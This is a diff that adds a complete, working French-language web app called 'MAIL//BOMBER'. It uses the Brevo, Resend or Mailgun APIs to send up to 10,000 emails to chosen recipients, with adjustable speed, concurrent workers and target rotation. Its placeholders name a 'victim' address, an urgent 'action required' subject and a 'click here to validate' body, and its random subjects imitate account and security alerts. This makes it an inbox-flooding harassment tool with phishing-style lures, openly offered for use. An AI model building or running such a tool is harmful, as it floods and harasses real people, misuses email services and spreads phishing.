@@ -1,0 +1,340 @@
+<!doctype html>
+<html lang="fr">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+<title>MAIL//BOMBER — Liquid</title>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;800&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
+<style>
+:root{--bg0:#05060a;--bg1:#0a0d18;--glass:rgba(255,255,255,.045);--glass-hi:rgba(255,255,255,.09);--stroke:rgba(255,255,255,.14);--text:#e8ecf5;--muted:#8a93a6;--accent:#5eead4;--accent2:#818cf8;--danger:#f87171;--ok:#34d399;--blur:22px}
+*{box-sizing:border-box;margin:0;padding:0}
+body{background:radial-gradient(1200px 800px at 20% 10%,#0f1638 0%,transparent 60%),radial-gradient(1000px 900px at 90% 90%,#1a0b2e 0%,transparent 55%),linear-gradient(180deg,var(--bg0),var(--bg1));color:var(--text);font-family:'Inter',system-ui,sans-serif;overflow-x:hidden;min-height:100vh}
+#bg{position:fixed;inset:0;z-index:0;pointer-events:none;opacity:.65}
+.scene{position:relative;z-index:1;max-width:1280px;margin:0 auto;padding:24px 20px 40px;display:flex;flex-direction:column;gap:20px}
+.glass{background:linear-gradient(180deg,var(--glass),var(--glass-hi));border:1px solid var(--stroke);border-radius:22px;backdrop-filter:blur(var(--blur)) saturate(160%);-webkit-backdrop-filter:blur(var(--blur)) saturate(160%);box-shadow:0 1px 0 rgba(255,255,255,.15) inset,0 -1px 0 rgba(0,0,0,.4) inset,0 20px 40px -20px rgba(0,0,0,.8),0 8px 24px -12px rgba(94,234,212,.15);position:relative;overflow:hidden}
+.glass::before{content:"";position:absolute;inset:0;border-radius:inherit;background:linear-gradient(120deg,transparent 30%,rgba(255,255,255,.08) 50%,transparent 70%);pointer-events:none;mix-blend-mode:overlay}
+.glass::after{content:"";position:absolute;top:0;left:0;right:0;height:1px;background:linear-gradient(90deg,transparent,rgba(255,255,255,.5),transparent)}
+.nav{display:flex;justify-content:space-between;align-items:center;padding:16px 22px}
+.logo{display:flex;align-items:center;gap:12px;font-weight:800;letter-spacing:.5px}
+.dot{width:10px;height:10px;border-radius:50%;background:radial-gradient(circle at 30% 30%,#fff,var(--accent));box-shadow:0 0 14px var(--accent);animation:pulse 2s ease-in-out infinite}
+@keyframes pulse{50%{transform:scale(1.15);opacity:.85}}
+.brand .slash{color:var(--accent)}
+.status{display:flex;align-items:center;gap:10px;font-family:'JetBrains Mono',monospace;font-size:13px;color:var(--muted)}
+.led{width:8px;height:8px;border-radius:50%;background:var(--muted);transition:.3s}
+.led.live{background:var(--ok);box-shadow:0 0 12px var(--ok)}
+.led.busy{background:var(--accent2);box-shadow:0 0 12px var(--accent2);animation:pulse 1s infinite}
+.led.err{background:var(--danger);box-shadow:0 0 12px var(--danger)}
+.grid{display:grid;grid-template-columns:1fr 1fr;gap:20px}
+.span-2{grid-column:1/-1}
+@media(max-width:800px){.grid{grid-template-columns:1fr}}
+.card{padding:22px}
+.card h2{font-size:13px;font-weight:800;letter-spacing:2px;text-transform:uppercase;color:var(--accent);margin-bottom:18px}
+label{display:block;font-size:12px;color:var(--muted);margin:14px 0 6px;font-weight:600;letter-spacing:.3px}
+label small{color:#5a6377;font-weight:400}
+input,textarea,select{width:100%;background:rgba(0,0,0,.35);border:1px solid var(--stroke);border-radius:12px;color:var(--text);font:inherit;font-size:14px;padding:11px 14px;outline:none;transition:.2s;font-family:'JetBrains Mono',monospace}
+textarea{resize:vertical;min-height:60px}
+input:focus,textarea:focus,select:focus{border-color:var(--accent);box-shadow:0 0 0 3px rgba(94,234,212,.15);background:rgba(0,0,0,.5)}
+input[type=range]{appearance:none;height:6px;background:linear-gradient(90deg,var(--accent),var(--accent2));border-radius:99px;padding:0}
+input[type=range]::-webkit-slider-thumb{appearance:none;width:20px;height:20px;border-radius:50%;background:radial-gradient(circle at 30% 30%,#fff,#cbd5e1);border:2px solid var(--accent);box-shadow:0 0 16px var(--accent);cursor:pointer}
+.row{display:flex;justify-content:space-between;font-family:'JetBrains Mono',monospace;font-size:12px;color:var(--muted);margin-top:6px}
+.segmented{display:flex;background:rgba(0,0,0,.35);border-radius:12px;padding:4px;gap:4px;border:1px solid var(--stroke)}
+.segmented button{flex:1;background:transparent;border:none;color:var(--muted);padding:9px;border-radius:9px;cursor:pointer;font:inherit;font-weight:600;font-size:12px;transition:.2s}
+.segmented button.active{background:linear-gradient(180deg,rgba(94,234,212,.25),rgba(129,140,248,.25));color:#fff;box-shadow:0 0 12px rgba(94,234,212,.25)}
+.actions{display:flex;gap:10px;margin-top:20px}
+.btn{flex:1;padding:12px;border-radius:12px;border:1px solid var(--stroke);background:rgba(255,255,255,.06);color:var(--text);font:inherit;font-weight:600;cursor:pointer;transition:.2s}
+.btn:hover{background:rgba(255,255,255,.12)}
+.btn.primary{background:linear-gradient(180deg,rgba(94,234,212,.35),rgba(129,140,248,.35));border-color:rgba(94,234,212,.5);box-shadow:0 0 24px -6px rgba(94,234,212,.4)}
+.btn.danger{border-color:rgba(248,113,113,.4);color:#fecaca}
+.btn.danger:hover{background:rgba(248,113,113,.15)}
+.btn:disabled{opacity:.4;cursor:not-allowed}
+.stats{display:grid;grid-template-columns:repeat(5,1fr);gap:12px;margin-bottom:16px}
+.stat{background:rgba(0,0,0,.35);border:1px solid var(--stroke);border-radius:14px;padding:14px;text-align:center}
+.stat span{display:block;font-family:'JetBrains Mono',monospace;font-size:22px;font-weight:700;color:var(--accent);text-shadow:0 0 14px rgba(94,234,212,.4)}
+.stat small{display:block;font-size:11px;color:var(--muted);margin-top:4px;letter-spacing:.5px}
+@media(max-width:700px){.stats{grid-template-columns:repeat(2,1fr)}}
+.progress{height:8px;background:rgba(0,0,0,.5);border-radius:99px;overflow:hidden;margin-bottom:14px;border:1px solid var(--stroke)}
+.bar{height:100%;width:0;background:linear-gradient(90deg,var(--accent),var(--accent2));transition:width .2s}
+.log{background:rgba(0,0,0,.5);border:1px solid var(--stroke);border-radius:14px;padding:14px;height:200px;overflow-y:auto;font-family:'JetBrains Mono',monospace;font-size:12px;line-height:1.6}
+.log .ok{color:var(--ok)}.log .err{color:var(--danger)}.log .info{color:var(--muted)}
+.foot{display:flex;justify-content:space-between;padding:14px 22px;font-family:'JetBrains Mono',monospace;font-size:12px;color:var(--muted)}
+.tilt{transform-style:preserve-3d;transition:transform .15s ease-out}
+.hint{font-size:11px;color:var(--muted);margin-top:6px;line-height:1.5}
+.hint a{color:var(--accent);text-decoration:none}
+</style>
+</head>
+<body>
+<canvas id="bg"></canvas>
+<div class="scene">
+  <header class="glass nav">
+    <div class="logo"><span class="dot"></span><span class="brand">MAIL<span class="slash">//</span>BOMBER</span></div>
+    <div class="status"><span class="led" id="led"></span><span id="statusText">idle</span></div>
+  </header>
+
+  <main class="grid">
+    <section class="glass card tilt" data-tilt>
+      <h2>Provider</h2>
+      <div class="segmented" id="provider">
+        <button data-p="brevo" class="active">Brevo</button>
+        <button data-p="resend">Resend</button>
+        <button data-p="mailgun">Mailgun</button>
+      </div>
+      <div class="hint" id="providerHint"></div>
+
+      <label>API Key <small>(stockée en localStorage)</small></label>
+      <input id="apiKey" type="password" placeholder="ta clé API">
+
+      <label>Domain (Mailgun seulement)</label>
+      <input id="domain" type="text" placeholder="mg.tondomaine.com">
+
+      <label>Expéditeur vérifié</label>
+      <input id="from" type="email" placeholder="expediteur@tondomaine.com">
+
+      <label>Nom affiché</label>
+      <input id="fromName" type="text" placeholder="Support">
+    </section>
+
+    <section class="glass card tilt" data-tilt>
+      <h2>Message</h2>
+      <label>Destinataire(s) <small>(virgule = rotation)</small></label>
+      <textarea id="to" rows="2" placeholder="victim@example.com"></textarea>
+      <label>Sujet</label>
+      <input id="subject" type="text" placeholder="URGENT — action requise">
+      <label>Corps <small>(HTML supporté)</small></label>
+      <textarea id="body" rows="4" placeholder="<b>Cliquez ici</b> pour valider…"></textarea>
+      <label>Threading</label>
+      <select id="threading">
+        <option value="none">Aucun</option>
+        <option value="re">Re:</option>
+        <option value="fwd">Fwd:</option>
+        <option value="rand">Sujets aléatoires</option>
+      </select>
+    </section>
+
+    <section class="glass card tilt" data-tilt>
+      <h2>Engine</h2>
+      <label>Nombre total</label>
+      <input id="count" type="number" min="1" max="10000" value="20">
+      <label>Vitesse (emails/sec)</label>
+      <input id="rate" type="range" min="1" max="100" value="5">
+      <div class="row"><span id="rateVal">5</span> /s</div>
+      <label>Concurrence</label>
+      <input id="concurrency" type="range" min="1" max="20" value="3">
+      <div class="row"><span id="concVal">3</span> workers</div>
+      <div class="actions">
+        <button class="btn primary" id="start">▶ Start</button>
+        <button class="btn" id="pause">⏸</button>
+        <button class="btn danger" id="stop">■</button>
+      </div>
+    </section>
+
+    <section class="glass card tilt" data-tilt>
+      <h2>Telemetry</h2>
+      <div class="stats">
+        <div class="stat"><span id="sent">0</span><small>envoyés</small></div>
+        <div class="stat"><span id="acked">0</span><small>ack</small></div>
+        <div class="stat"><span id="failed">0</span><small>échecs</small></div>
+        <div class="stat"><span id="eps">0</span><small>e/s</small></div>
+        <div class="stat"><span id="elapsed">0s</span><small>durée</small></div>
+      </div>
+      <div class="progress"><div class="bar" id="bar"></div></div>
+      <div class="log" id="log"></div>
+    </section>
+  </main>
+
+  <footer class="glass foot">
+    <span>outcome // mail-bomber v1.1</span>
+    <span id="clock"></span>
+  </footer>
+</div>
+
+<script>
+// ─── particles ───
+(()=>{const c=document.getElementById('bg'),x=c.getContext('2d',{alpha:true,desynchronized:true});let W,H,D,ps=[];const rs=()=>{D=Math.min(devicePixelRatio||1,2);W=c.width=innerWidth*D;H=c.height=innerHeight*D;c.style.width=innerWidth+'px';c.style.height=innerHeight+'px';const n=Math.floor(innerWidth*innerHeight/18000);ps=Array.from({length:n},()=>({x:Math.random()*W,y:Math.random()*H,vx:(Math.random()-.5)*.3*D,vy:(Math.random()-.5)*.3*D,r:(Math.random()*1.6+.4)*D,h:Math.random()<.5?170:240,a:Math.random()*.6+.2}))};const t=()=>{x.clearRect(0,0,W,H);for(const p of ps){p.x+=p.vx;p.y+=p.vy;if(p.x<0)p.x=W;if(p.x>W)p.x=0;if(p.y<0)p.y=H;if(p.y>H)p.y=0;x.beginPath();x.arc(p.x,p.y,p.r,0,Math.PI*2);x.fillStyle=`hsla(${p.h},90%,70%,${p.a})`;x.shadowBlur=12*D;x.shadowColor=`hsla(${p.h},90%,70%,.8)`;x.fill()}x.shadowBlur=0;requestAnimationFrame(t)};addEventListener('resize',rs,{passive:true});rs();requestAnimationFrame(t)})();
+
+// ─── tilt ───
+document.querySelectorAll('[data-tilt]').forEach(card=>{let raf=null;card.addEventListener('mousemove',e=>{const r=card.getBoundingClientRect(),cx=r.left+r.width/2,cy=r.top+r.height/2,dx=(e.clientX-cx)/(r.width/2),dy=(e.clientY-cy)/(r.height/2);if(raf)cancelAnimationFrame(raf);raf=requestAnimationFrame(()=>{card.style.transform=`perspective(900px) rotateX(${-dy*8}deg) rotateY(${dx*8}deg)`})});card.addEventListener('mouseleave',()=>{if(raf)cancelAnimationFrame(raf);card.style.transform='perspective(900px) rotateX(0) rotateY(0)'})});
+
+// ─── provider hints ───
+const hints = {
+  brevo:'clé API sur <a href="https://app.brevo.com/settings/keys/api" target="_blank">app.brevo.com → SMTP & API → API Keys</a>. CORS activé. 300 emails/jour gratuit.',
+  resend:'clé sur <a href="https://resend.com/api-keys" target="_blank">resend.com/api-keys</a>. Domaine vérifié requis. 100/jour gratuit.',
+  mailgun:'clé sur <a href="https://app.mailgun.com/settings/api_security" target="_blank">app.mailgun.com → API Security</a>. Domaine sandbox ou vérifié. CORS activé.'
+};
+let provider = 'brevo';
+document.querySelectorAll('#provider button').forEach(b=>{
+  b.addEventListener('click',()=>{
+    document.querySelectorAll('#provider button').forEach(x=>x.classList.remove('active'));
+    b.classList.add('active');
+    provider = b.dataset.p;
+    document.getElementById('providerHint').innerHTML = hints[provider];
+  });
+});
+document.getElementById('providerHint').innerHTML = hints.brevo;
+
+// ─── persistence ───
+const $ = id => document.getElementById(id);
+const persistKeys = ['apiKey','domain','from','fromName','to','subject','body','count','rate','concurrency','threading'];
+persistKeys.forEach(k=>{
+  const el = $(k);
+  const saved = localStorage.getItem('mb_'+k);
+  if(saved !== null) el.value = saved;
+  el.addEventListener('input',()=>localStorage.setItem('mb_'+k,el.value));
+});
+$('rate').addEventListener('input',e=>$('rateVal').textContent=e.target.value);
+$('concurrency').addEventListener('input',e=>$('concVal').textContent=e.target.value);
+$('rateVal').textContent = $('rate').value;
+$('concVal').textContent = $('concurrency').value;
+
+// ─── log ───
+const log = $('log');
+const pushLog=(k,t)=>{const el=document.createElement('div');el.className=k;const ts=new Date().toLocaleTimeString();el.textContent=`[${ts}] ${t}`;log.appendChild(el);log.scrollTop=log.scrollHeight;if(log.children.length>500)log.removeChild(log.firstChild)};
+const setStatus=(s,t)=>{$('led').className='led '+s;$('statusText').textContent=t};
+
+// ─── provider adapters ───
+const adapters = {
+  brevo: (k, payload) => fetch('https://api.brevo.com/v3/smtp/email', {
+    method:'POST',
+    headers:{'accept':'application/json','content-type':'application/json','api-key':k},
+    body: JSON.stringify(payload)
+  }),
+  resend: (k, payload) => fetch('https://api.resend.com/emails', {
+    method:'POST',
+    headers:{'content-type':'application/json','authorization':'Bearer '+k},
+    body: JSON.stringify(payload)
+  }),
+  mailgun: (k, payload, domain) => fetch(`https://api.mailgun.net/v3/${domain}/messages`, {
+    method:'POST',
+    headers:{'authorization':'Basic '+btoa('api:'+k),'content-type':'application/x-www-form-urlencoded'},
+    body: new URLSearchParams({
+      from: payload.from, to: payload.to, subject: payload.subject, html: payload.html
+    })
+  })
+};
+
+const buildPayload = (job) => {
+  if(provider === 'brevo') return {
+    sender:{email:$('from').value, name:$('fromName').value||undefined},
+    to:[{email:job.to}],
+    subject:job.subject,
+    htmlContent:job.html
+  };
+  if(provider === 'resend') return {
+    from: ($('fromName').value||'') + ' <' + $('from').value + '>',
+    to:[job.to],
+    subject:job.subject,
+    html:job.html
+  };
+  if(provider === 'mailgun') return {
+    from: ($('fromName').value||'') + ' <' + $('from').value + '>',
+    to:job.to,
+    subject:job.subject,
+    html:job.html
+  };
+};
+
+// ─── engine ───
+let running=false, paused=false, abortC=null, sent=0, acked=0, failed=0, startedAt=0, inFlight=0, queue=[], total=0;
+
+const sleep = ms => new Promise(r=>setTimeout(r,ms));
+
+const randomSubject = () => ['URGENT','Action requise','Votre compte','Vérification','Notification','Facture','Sécurité','Mise à jour'][Math.floor(Math.random()*8)] + ' — ' + Math.random().toString(36).slice(2,8);
+
+async function dispatch(job){
+  if(!running || paused) return;
+  inFlight++;
+  const apiKey = $('apiKey').value.trim();
+  const domain = $('domain').value.trim();
+  const payload = buildPayload(job);
+
+  try {
+    const res = await adapters[provider](apiKey, payload, domain);
+    sent++; $('sent').textContent = sent;
+    if(res.ok){
+      acked++; $('acked').textContent = acked;
+      pushLog('ok', `✓ ${job.to}`);
+    } else {
+      failed++; $('failed').textContent = failed;
+      const txt = await res.text().catch(()=>'');
+      pushLog('err', `✗ ${res.status} ${job.to} — ${txt.slice(0,120)}`);
+    }
+  } catch(e){
+    sent++; failed++;
+    $('sent').textContent = sent; $('failed').textContent = failed;
+    pushLog('err', `✗ ${e.message}`);
+  } finally {
+    inFlight--;
+    $('bar').style.width = (sent/total*100)+'%';
+  }
+}
+
+async function startEngine(){
+  if(running) return;
+  const apiKey = $('apiKey').value.trim();
+  const from = $('from').value.trim();
+  const toRaw = $('to').value.trim();
+  if(!apiKey) return alert('Renseigne ta clé API.');
+  if(!from) return alert('Renseigne l\'expéditeur vérifié.');
+  if(!toRaw) return alert('Renseigne au moins un destinataire.');
+  if(provider === 'mailgun' && !$('domain').value.trim()) return alert('Renseigne ton domaine Mailgun.');
+
+  running = true; paused = false;
+  sent = acked = failed = 0;
+  $('sent').textContent = $('acked').textContent = $('failed').textContent = '0';
+  $('bar').style.width = '0%';
+  startedAt = performance.now();
+
+  const targets = toRaw.split(',').map(s=>s.trim()).filter(Boolean);
+  total = +$('count').value;
+  const rate = +$('rate').value;
+  const conc = +$('concurrency').value;
+  const threading = $('threading').value;
+  const subjectBase = $('subject').value;
+  const html = $('body').value;
+
+  queue = Array.from({length:total},(_,i)=>{
+    let subj = subjectBase;
+    if(threading==='re') subj = 'Re: '+subjectBase;
+    else if(threading==='fwd') subj = 'Fwd: '+subjectBase;
+    else if(threading==='rand') subj = randomSubject();
+    return {to: targets[i%targets.length], subject: subj, html};
+  });
+
+  setStatus('busy','running');
+  pushLog('info', `start ${total} @ ${rate}/s, conc ${conc}, via ${provider}`);
+
+  const interval = 1000/rate;
+  const t0 = performance.now();
+  let idx = 0;
+
+  const tickStats = () => {
+    if(!running) return;
+    const dt = (performance.now()-startedAt)/1000 || 1;
+    $('elapsed').textContent = Math.floor(dt)+'s';
+    $('eps').textContent = (sent/dt).toFixed(1);
+    requestAnimationFrame(tickStats);
+  };
+  tickStats();
+
+  (async()=>{
+    while(running && idx < queue.length){
+      if(paused){ await sleep(100); continue; }
+      if(inFlight >= conc){ await sleep(10); continue; }
+      const wait = (t0 + idx*interval) - performance.now();
+      if(wait > 0) await sleep(wait);
+      dispatch(queue[idx++]);
+    }
+    while(running && inFlight > 0) await sleep(50);
+    running = false;
+    setStatus('','done');
+    pushLog('info','— finished —');
+  })();
+}
+
+$('start').addEventListener('click', startEngine);
+$('pause').addEventListener('click',()=>{ if(!running)return; paused=!paused; setStatus(paused?'live':'busy', paused?'paused':'running'); pushLog('info', paused?'paused':'resumed') });
+$('stop').addEventListener('click',()=>{ running=false; paused=false; setStatus('','idle'); pushLog('info','stopped') });
+
+setInterval(()=>$('clock').textContent=new Date().toLocaleTimeString(),1000);
+</script>
+</body>
+</html>
